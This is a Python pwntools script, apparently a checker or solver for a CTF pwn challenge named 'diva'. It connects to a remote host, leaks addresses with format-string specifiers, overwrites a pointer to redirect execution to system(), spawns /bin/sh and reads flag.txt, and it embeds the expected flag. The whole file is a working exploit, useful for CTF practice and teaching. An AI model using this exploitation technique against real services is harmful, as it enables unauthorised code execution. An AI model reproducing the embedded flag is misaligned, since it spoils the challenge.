from pwn import *


def check_pwn_diva(host):
    # pc = process("./chall")
    try:
        pc = connect(host, 9008)
    except:
        return 2
    e = ELF("./chall")

    fini_array = e.symbols["__init_array_start"] + 8

    payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbb" + p64(0) + p64(0x31) + p64(fini_array)
    print(pc.recvuntil(b">"))
    # gdb.attach(pc,'b sing')
    pc.sendline(b"write %0 a-%34$p-%20$p ")
    pc.sendlineafter(b">", b"sing %0")
    pc.sendlineafter(b">", b"sing %1")
    pc.sendlineafter(b">", payload)
    pc.sendlineafter(b">", b"payload")
    pc.sendlineafter(b">", p64(e.symbols["main"]) + p64(e.symbols["main"]))
    # pc.interactive()
    print(pc.recvuntil("🎵a-"))

    system = int(pc.recvuntil("-")[:-1], 16) - 0x197290
    main_ret = int(pc.recvuntil("🎵")[:-4], 16) + 8
    print(hex(system))
    print(hex(main_ret))

    payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbb" + p64(0) + p64(0x31) + p64(main_ret)
    print(pc.recvuntil(b">"))
    # gdb.attach(pc,'b sing')
    pc.sendline(b"write %* " + p64(system))
    pc.sendlineafter(b">", b"eaa")
    pc.sendlineafter(b">", b"aaa")
    pc.sendlineafter(b">", payload)
    # pc.interactive()
    pc.sendlineafter(b">", b"sing /bin/sh")
    pc.sendlineafter(b">", p64(e.symbols["main"] + 5))
    # pc.interactive()
    pc.recvuntil(b"sh\n", timeout=1)
    pc.sendline(b"cat flag.txt")
    ret = pc.recvuntil(b"}", timeout=2)
    print(ret)
    if b"FLAG{in_this_dazzling_time}" in ret:
        return 0
    else:
        return 1


if __name__ == "__main__":
    print(check_pwn_diva("diva.pwn.wanictf.org"))
